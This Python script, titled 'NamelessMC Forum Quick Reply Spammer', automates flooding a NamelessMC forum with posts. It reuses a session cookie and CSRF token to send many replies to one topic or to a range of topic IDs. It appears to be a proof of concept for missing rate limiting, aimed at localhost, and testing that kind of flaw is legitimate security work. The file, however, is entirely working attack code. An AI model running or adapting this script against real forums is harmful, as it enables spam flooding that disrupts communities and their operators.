import requests
import argparse

BASE_URL = "http://localhost:8080"
COMMON_HEADERS = {
    "Host": "localhost:8080",
    "Cache-Control": "max-age=0",
    "Accept-Language": "ko-KR,ko;q=0.9",
    "Content-Type": "application/x-www-form-urlencoded",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
}

def send_quick_reply(topic_id: int, content: str, token: str, phpsessid: str):
    url = f"{BASE_URL}/forum/topic/{topic_id}"
    headers = COMMON_HEADERS.copy()
    headers["Referer"] = url
    headers["Origin"] = BASE_URL
    headers["Cookie"] = f"cookieconsent_status=allow; PHPSESSID={phpsessid}; nmc_panel_theme=light; nl-topic-{topic_id}=true"

    data = {
        "content": content,
        "token": token,
    }

    response = requests.post(url, headers=headers, data=data)
    print(f"[Topic {topic_id}] Status {response.status_code} - Response Length: {len(response.text)}")

def spam_single_topic(topic_id: int, token: str, phpsessid: str, count: int = 100):
    for i in range(count):
        content = f"<p>Quick reply spam message {i}</p>"
        send_quick_reply(topic_id, content, token, phpsessid)

def spam_multiple_topics(start_id: int, end_id: int, token: str, phpsessid: str):
    for topic_id in range(start_id, end_id + 1):
        content = f"<p>Quick reply spam message on topic {topic_id}</p>"
        send_quick_reply(topic_id, content, token, phpsessid)

def main():
    parser = argparse.ArgumentParser(description="NamelessMC Forum Quick Reply Spammer")
    parser.add_argument("--mode", choices=["single", "multi"], required=True, help="Select spam mode: 'single' for one topic, 'multi' for multiple topics")
    parser.add_argument("--token", required=True, help="CSRF token value")
    parser.add_argument("--phpsessid", required=True, help="PHPSESSID cookie value")
    parser.add_argument("--topic-id", type=int, help="Target topic ID for single mode")
    parser.add_argument("--count", type=int, default=100, help="Number of quick replies in single mode (default: 100)")
    parser.add_argument("--start-id", type=int, help="Start topic ID for multi mode")
    parser.add_argument("--end-id", type=int, help="End topic ID for multi mode")

    args = parser.parse_args()

    if args.mode == "single":
        if args.topic_id is None:
            parser.error("--topic-id is required for single mode")
        spam_single_topic(args.topic_id, args.token, args.phpsessid, args.count)

    elif args.mode == "multi":
        if args.start_id is None or args.end_id is None:
            parser.error("--start-id and --end-id are required for multi mode")
        spam_multiple_topics(args.start_id, args.end_id, args.token, args.phpsessid)

if __name__ == "__main__":
    main()
